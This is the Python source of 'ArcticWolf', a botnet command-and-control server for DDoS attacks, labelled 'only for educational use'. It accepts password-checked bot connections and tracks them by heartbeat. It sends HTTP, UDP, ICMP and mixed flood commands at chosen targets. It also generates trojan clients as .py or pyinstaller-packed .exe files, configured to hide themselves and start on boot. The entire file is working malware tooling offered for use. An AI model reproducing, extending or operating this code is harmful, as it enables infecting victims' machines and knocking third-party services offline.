# -*- coding:utf-8 -*-
# @FileName  :main.py
# @Author    :D0WE1L1N
import threading, socket, time, json
from sys import path
from platform import system as system_type
from os import system, remove, mkdir, _exit
from os import path as os_path
from shutil import rmtree, copy
from random import randint
from winsound import Beep
datasock_list = {}  # dict of bots  {Number(int):socket}
last_Heartbeat = {}  # recored the time a bot send its heartbeat message
ddos_attack_list = [] # recored ddos attack launched
mode_list = ['httpGETflood', 'httpPOSTflood', 'UDPflood', 'ICMPflood', 'Mix'] # attack_method
# printed with color
def print_error(str : str):
    '''error thing printed'''
    print('\033[0;31m' + '[-] ' + str + '\033[0m')
def print_good(str : str, add_symbol=True, line_break=False):
    '''
    good thing printed
    add [+] if add_symbol is True
    line break if line_break is True
    '''
    print_str = '\033[0;36m' + str + '\033[0m'
    if add_symbol:
        print_str = '\033[0;36m' + '[+] ' + str + '\033[0m'
    if line_break:
        print_str = '\n' + print_str
    print(print_str)
    
def print_warn(str : str):
    '''warn thing printed'''
    print('\033[0;33m' + '[!] ' + str + '\033[0m')
def print_normal(str : str, add_symbol=True):
    '''
    normal thing printed
    add [*] if add_symbol is True
    '''
    if add_symbol:
        print('\033[0;34m' + '[*] ' + str + '\033[0m')
    else:
        print('\033[0;34m' + str + '\033[0m')
# if colorama is not installed, print with color may be error in Windows cmd
if system_type == 'Windows':
    try: # check if colorama is installed
        from colorama import init,Fore,Back,Style
        init(autoreset=True) 
    except ImportError:
            print_warn('Colorma library import failed, print with color may be error')
def post_cmd():
    '''main method to input command'''
    def gen_py(mode : str):
        '''
        method to generate .py virus
        mode is the writing format, such as' py 'and' exe '
        Used for virus installation
        return the name of the virus(not include .py)
        '''
        def delete_lines(filename, head):
            '''Delete the first few lines of test code to output the source file'''
            with open(filename, 'r') as fin:
                a = fin.readlines()
                print_normal("Deleting test code......")
                py_txt = ''.join(a[head:-1])
            return py_txt
        print_normal("Copying source......")
        py_txt = delete_lines('Resource/client_source.py', 10) #Varies with the number of Settings!!!
        name = "py_virus" + str(randint(100000, 900000))
        with open(name+'.py', "w") as fw:
            # write the settings to the virus
            print_normal('Using config loaded from ./Data/settings.json')
            if settings_data['BotNet']['Password'] == '':
                print_warn('Password is empty, using random password')
                random_str =''
                base_str ='ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789'
                length =len(base_str) -1
                for i in range(16): # Random password (16 length)
                    random_str += base_str[randint(0, length)]
                change_password(random_str)
            fw.write(f"Password = '{Password}'\n")
            fw.write(f"delay = {settings_data['Bots']['Attack_delay']}\n")
            fw.write(f"address = '{frpip}'\n")
            fw.write(f"port = {frpport}\n")
            fw.write(f'mode = "{mode}"\n')
            fw.write(f"Threads = {settings_data['Bots']['Threads_num']}\n") 
            fw.write(f"Attribute_hide = {settings_data['Bots']['Attribute_hide']}\n")
            fw.write(f"Self_starting = {settings_data['Bots']['Self_starting']}\n")
            fw.write(F"buffsize = {settings_data['BotNet']['Buffsize']}\n")
            print_normal(f"Writing virus to connect {ip} : {port}......")
            fw.write(py_txt)
        print_good(f"{name+'.py'} virus generated successfully")
        return name
    def reload():
        '''Method to reload the settings'''
        global settings_data, buffsize, last_Heartbeat, Password
        Heartbeat_open_before = settings_data['BotNet']['Heartbeat']
        with open("./Data/settings.json", 'r') as f:
            settings_data = json.load(f)
        if settings_data['BotNet']['Heartbeat'] and not Heartbeat_open_before: # check if the heartbeat system is opened
            print_normal('Heartbeat system started')
            last_Heartbeat = {}
            threading.Thread(target=tcplink, args=()).start()
        buffsize = settings_data['BotNet']['Buffsize']
        if settings_data['BotNet']['Password'] != Password:
            print_warn(f'Password change from {Password} to {settings_data["BotNet"]["Password"]}')
            Password = settings_data['BotNet']['Password']
        print_normal('Settings data reloaded')
    def change_password(new_password : str):
        '''Method for changing password of the botnet'''
        global Password
        with open('Data/settings.json', 'w') as f: # clear the old setting file
            settings_data['BotNet']['Password'] = new_password
            json.dump(settings_data, f)
            f.flush()
            print_warn(f'New password : {new_password}')
            Password = new_password
            reload()
    while True:
        command = input('ArcticWolf: >>> ')
        if command == 'ol_num':
        # online bots number in total
            print_normal(f'{len(datasock_list)} bots online')
        # elif command == 'check':
        #     send(command)
        elif command == 'ls':
        # list all the bots
            if len(datasock_list) < 1:
                print_normal('no bots online')
            else:
                print_normal("listing all the bots")
                print_normal("NO.          ip            port          host_name", False)
                num = 1
                for i in datasock_list.values():
                    client_addr = i.getpeername()
                    print_normal(f" {num}        {client_addr[0]}        {client_addr[1]}        {socket.gethostbyaddr(client_addr[0])[0]}", False)
                    num += 1
        elif command == "info":
            # info of this host
            host_name = socket.gethostname()
            print_normal("Attack host info:")
            print_normal(f"Host name: {host_name}", False)
            print_normal(f"IP address: {ip}", False)
            print_normal(f"PORT number: {port}", False)
            print_normal(f"Botnet Password: '{Password}'", False)
            print_normal(f'Botnet online number: {len(datasock_list)}', False)
        elif command == 'reload':
            reload()
        elif command == 'clear_history':
            global history_file
            history_file.truncate(0)
        elif command == 'ping':
            print_normal('PONG') # ???
        elif command == 'gen_py':
            gen_py('py')
        elif command == 'gen_exe':	
            print_warn('Please make sure you install pyinstaller, if not, install it by "pip install pyinstaller"')
            name = gen_py('exe')
            # generate .exe virus file
            print_normal(f"using pyinstaller to pack the .py file")
            upx_command = input("please input your UPX dir(blank for none) >>> ")
            print_normal("Packing with pyinstaller, please wait for a while")
            if upx_command != '':
                upx_command = '--upx-dir ' + upx_command
            else:
                print_warn("TO MAKE THE PAYLOAD SMALLER, YOU'D BETTER INSTALL UPX AT https://upx.github.io/")
            try:
                basic_command = f"pyinstaller -p {path[4]}/Lib/site-packages -F {name}.py {upx_command} -w -i ./Resource/icon.ico --log-level FATAL --clean"
                system(basic_command)
            except Exception as e:
                print_error(e)
                print_error('Make sure that you install pyinstaller')
            print_normal("clearing temp files")
            copy(f'./dist/{name}.exe', f'./{name}.exe')
            remove(f"{name}.spec")
            remove(f'{name}.py')
            rmtree("build")
            rmtree("dist")
            print_good(f"{name}.exe virus generated successfully")
            
        elif command == 'attack_mode':
            print_normal(f"Available attack method {mode_list}")
        elif command == 'shut':
            if input(f'Are your sure to shutdown all the bots?, bots num : {len(datasock_list)} (y/n): >>> ') == 'y' or 'Y' or 'yes' or 'YES' or 'Yes':
                send('shut')
        elif command == 'attacking_list':
            print_normal(f'Available attacks : {ddos_attack_list}')
        elif command.split('_')[0] == 'attack':
            try:
            # ddos attack
                attack_bots = input('Input the No. of the bots you wanted to issue your attack command[use "-" and "," to seperate, DO NOT USE BLANK BETWEEN THEM](Blank for all): >>> ')  or 'ALL'
                target = command.split('_')[2]
                if target in ddos_attack_list:
                    if input(f'Already attacking {target}, Do you want do attack it twice at a time?(y/n): >>> ') != 'y':
                        continue
                mode = command.split('_')[1]
                if mode in mode_list:
                    ok = input(f'Are you sure to attack {target} using {mode}?(y,n) >>> ')
                    if ok == 'y' or ok == 'Y' or ok == 'yes' or ok == 'YES' or ok == '':
                        ddos_attack_list.append(target)
                        if send(command, attack_bots) != False:
                            History_write( f'Start to attack {target} with {mode}, using {attack_bots}', 'A')
                    else:
                        print_normal('All attack canceled')
                else:
                    print_error(f'Unknown attack method {mode}, print out the mode list {mode_list}')
            except:
                print_error(f'Unknown attack command : {command}, attack format : attack_[attack_mode]_[target]')
        elif command == 'stop_ddos':
            # stop attack
            attack_bots = input('Input the No. of the bots you wanted to issue your attack command[use "-" and "," to seperate, DO NOT USE BLANK BETWEEN THEM](Blank for all): >>> ') or 'ALL'
            ddos_attack_list.clear()
            if send(command, attack_bots) != False:
                History_write(f'Stop ddos attack to {attack_bots}')
        elif command.split('=')[0] == 'msg':
            # Only for test : send msg to bots
            send(command)
        elif command == 'exit':
            History_write('Exit')
            send('shut')
            _exit(0)
        elif command == 'help':
            # print help-
            print_normal("help:")
            print_normal('''
    ---------Info command---------

    ls : List the bot information
    ol_num: Check bot count           
    info : Print info of this host 
                
    --------Attack command--------
                
    attack_[attack_mode]_[target] : attack the target(url or ip) with attack_mode
    attack_mode : print out the available attack mode
    attacking_list : Print out the attack being executed 
    stop_ddos : Stop all attack command

    --------Trojan command--------
                
    gen_py : Generate .py trojen file          
    gen_exe : Generate .exe trojan file by pyinstaller
    
    --------Other command---------
                        
    exit : exit ArcticWolf
    shut : shutdown all the bots
    help : print out help
    clear_history : clear history file 
    reload : Reload settings in settings.json   
               
            ''', False)
        # Check the connection oa all bots : check
        elif command == "":
            continue
        else:
            print_error(f'Unknown command {command}, You can type help to receive instructions')

# write message to the log file
def History_write(string, _type='I'):
    global history_file
    history_file.writelines(f"({_type})[{time.strftime('%Y-%m-%d %H:%M:%S',time.localtime())}] : {string}\n")
    history_file.flush()
def tcplink():
    '''Heartbeat system'''
    global last_Heartbeat, datasock_list
    def disconnected(_type, No, sock):
        History_write(f"Bot No.{No} disconnected.", _type)
        print_error(f"Bot No.{No} disconnected.")
        sock.close()
        del datasock_list[No]
        del last_Heartbeat[sock]
    while True:

        try:
            if datasock_list == {}:
                continue
            if settings_data['BotNet']['Heartbeat']:
                for sock in list(last_Heartbeat.keys()):
                    No = [k for k,v in datasock_list.items() if v==sock][0]
                    try:
                        if time.time() - last_Heartbeat[sock] > 20:  # If no heartbeat message is received within 20 seconds, the client is disconnected
                            disconnected('I', No, sock)
                            break
                        send('heartbeat')  # send heartbeat message 
                        last_Heartbeat = recv('Time')
                        time.sleep(5)  # heartbeat per 5 seconds
                    except Exception as e:
                        disconnected('E', No, sock)
                        break
            else:
                return True
        except Exception as e:
            pass
def run():
    '''main method to accept connection'''
    def connect(clientsock, clientaddress):
        '''Method for those whose password is correct'''
        clientsock.send('OK'.encode('utf8'))
        biggest_No = 0
        for No in datasock_list.keys():
            if int(No) > biggest_No:
                biggest_No = int(No)
        biggest_No += 1
        Beep(440, 100)
        History_write(f'Bot connected, {clientaddress[0]} : {clientaddress[1]} --->>> {ip} : {port}')
        print_good(f"Bot No.{biggest_No} connected, {clientaddress[0]} : {clientaddress[1]} --->>> {ip} : {port}", line_break=True)
        last_Heartbeat[clientsock] = time.time()
        if clientsock not in datasock_list:
            datasock_list[biggest_No] = clientsock
    while True:
        clientsock, clientaddress = s.accept()
        # Check whether the connection target is an ArcticWolf bot
        clientsock.send('ArcticBotCheck'.encode('utf8')) # send checking message
        send_pwd = clientsock.recv(buffsize).decode('utf8') # recv password 
        if send_pwd == Password: 
            connect(clientsock, clientaddress)
        else:
            print_warn(f'A bot connect from {clientaddress[0]} : {clientaddress[1]} with wrong Password : {send_pwd}')
            choice = input('Accept it?[y/n]: >>> ') or 'n'
            if choice == 'y':
                connect(clientsock, clientaddress)
            else:
                print_normal(f'refused connect from {clientaddress[0]} : {clientaddress[1]}\n')
                clientsock.close()
                del clientsock



def send(com : str, target='ALL'):
    '''
    send command
    com : command will be sent
    target : No of the bots, format : 1-2 or 1,2 or 1, ALL for all bots
    '''
    try:
        No = 1
        for i in datasock_list.values():
            i.send('test'.encode('utf8'))
            No += 1 # Test if the machine is online
    except:
        i.close()
        del datasock_list[No]
        del last_Heartbeat[No]
        print_error(f'\nBot No{No} Disconnected\n')
    target_list = [] # target bots list
    # Attempt to process the input send target
    try:
        if target == 'ALL':
            target_list = datasock_list.values()
        elif ',' in target:
            for i in target.split(','):
                target_list.append(datasock_list[int(i)])
        elif '-' in target:
            start = int(target.split('-')[0])
            end = int(target.split('-')[1])
            for i in datasock_list.keys():
                if i >= start and i <= end:
                    target_list.append(datasock_list[i])
        else:
            target_list.append(datasock_list[int(target)])
    except:
        print_error(f"Wrong target input : {target}")
        return False
    if com.split('_')[0] == 'attack':
        print_warn(f'doing {com.split("_")[1]} on {com.split("_")[2]}')
        for i in target_list:
            i.sendall(com.encode('utf-8'))
        print_normal(f'Attack command has been issued to No.{target}')
    elif com.split('_')[0] == 'stop':
        for i in target_list:
            i.sendall(com.encode('utf-8'))
        print_normal(f'Stop command has been issued to No.{target}')
    elif com.split('=')[0] == 'msg':
        for i in datasock_list.values():
            i.sendall(com.split('=')[1].encode('utf-8'))
    elif com == 'shut':
        No = 1
        for i in datasock_list.values():
            i.sendall(com.encode('utf-8'))
            History_write('Shuting down all the connections')
            History_write(f'Bot No.{No} Disconnected')
            print_warn('Shuting down all the connections')
            print_normal(f'Bot No.{No} Disconnected')
            del last_Heartbeat[i]
            No += 1
        datasock_list.clear()
    else:
        for i in datasock_list.values():
            i.sendall(com.encode('utf-8'))
                
def recv(mode : str):
    '''
    The method to recv message
    There are two modes, Str mode returns the content, and Time mode returns the time
    '''
    recv_dict = {}
    if mode == 'Time':
        for i in datasock_list.values():
            i.recv(buffsize)
            recv_dict[i] = time.time()
    elif mode == 'Str':
        for i in datasock_list.values():
            recv_dict[i] = i.recv(buffsize)
    else:
        raise f'Wrong mode error, wrond mode {mode} was given'
    return recv_dict # The content or time returned by each machine is recorded

def check_input(input_str, mode, is_default=True):
    '''
    check the data is right(ip, port)
    is_default: whether default features are enabled (Spaces)
    '''
    var = input(f"please set your {input_str} >>> ")
    try:
        if mode == 'int_mode':
            if var == "" and is_default:
                print_warn(f"Blank input, setting {input_str} as default {input_str} {settings_data['BotNet']['Default_port']}")
                var = settings_data['BotNet']['Default_port']
                return var
            var = int(var)
            if var <= 65535:
                return var
            else:
                print_error(f"{input_str} error, please enter again")
                check_input(input_str, mode, is_default)
        elif mode == 'ip_mode':
            if var == "" and is_default:
                print_warn(f"Blank input, setting {input_str} as default {input_str} {settings_data['BotNet']['Default_ip']}")
                var = settings_data['BotNet']['Default_ip']
                return var
            socket.inet_aton(var)
            return var
    except:
        print_error(f"{input_str} error, please enter again")
        var = check_input(input_str, mode, is_default)    
        return var

if __name__ == '__main__':
    '''Program entry'''
    version = 'v0.1.6'
    print('\033[0;35m' + fr"""

===========================================================================

[ArcticWolf] : A botnet controller for Ddos attacks using frp (without server)
---------------------------------------------------------------------------
[Version] : {version}     [Author] : D0WE1LIN    ONLY FOR EDUCATIONAL USE!  

===========================================================================

     
   '   '   
  / \ / \                 __   .__         __      __        .__    _____ 
  /  _  \ _______   ____ _/  |_ |__|  ____ /  \    /  \ ____  |  | _/ ____\         ))
 /  /_\  \\_  __ \_/ ___\\   __\|  |_/ ___\\   \/\/   //  _ \ |  | \   __\       ))     
/    |    \|  | \/\  \___ |  |  |  |\  \___ \        /(  <_> )|  |__|  |      ))      
\____|__  /|__|    \___  >|__|  |__| \___  > \__/\  /  \____/ |____/|__|   )) 
        \/             \/                \/       \/                       
                                             
                                                               
"""  + '\033[0m')
    # See if initialization is required
    if not os_path.exists("./Data"):
        print_normal("Initializing......")
        mkdir("./Data") #Create the data folder
        default_settings_dict = { # Default Settings folder
            'BotNet' : {
                'Default_ip' : '127.0.0.1',
                'Default_port' : 6240,
                'Heartbeat' : True,
                'Buffsize' : 512,
                'Password' : ''
            },
            'Bots' : {
                'Threads_num' : 10,
                'Attribute_hide' : True,
                'Self_starting' : True,
                'Attack_delay' : 0.3
            }
        }
        with open("./Data/settings.json", 'w') as f:
            json.dump(default_settings_dict, f)
        settings_data = default_settings_dict
        history_file = open("./Data/History.config", 'w')
        History_write("Initializing")
    else:
        with open("./Data/settings.json", 'r') as f:
            settings_data = json.load(f)
        history_file = open("./Data/History.config", 'a')
    print_normal("Using settings from ./Data/settings.json")
    History_write("Opening")
    # Get the ip and port from inputing
    ip = check_input("ip", "ip_mode")
    port = check_input("port", "int_mode")
    frpip = check_input("frp_ip", "ip_mode")
    frpport = check_input("frp_port", "int_mode")
    buffsize = settings_data['BotNet']['Buffsize'] # Buffsize
    Password = settings_data['BotNet']['Password'] # Password of the botnet
    print_warn("You must make sure that this host is on at anytime to recive connection")
    print_normal(f"Start listening on {ip} : {port}")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((ip, port))
    s.listen(5)  # Maximum number of queued connections

    threading.Thread(target=run, args=()).start()
    threading.Thread(target=post_cmd, args=()).start()
    if settings_data['BotNet']['Heartbeat']:
        threading.Thread(target=tcplink, args=()).start()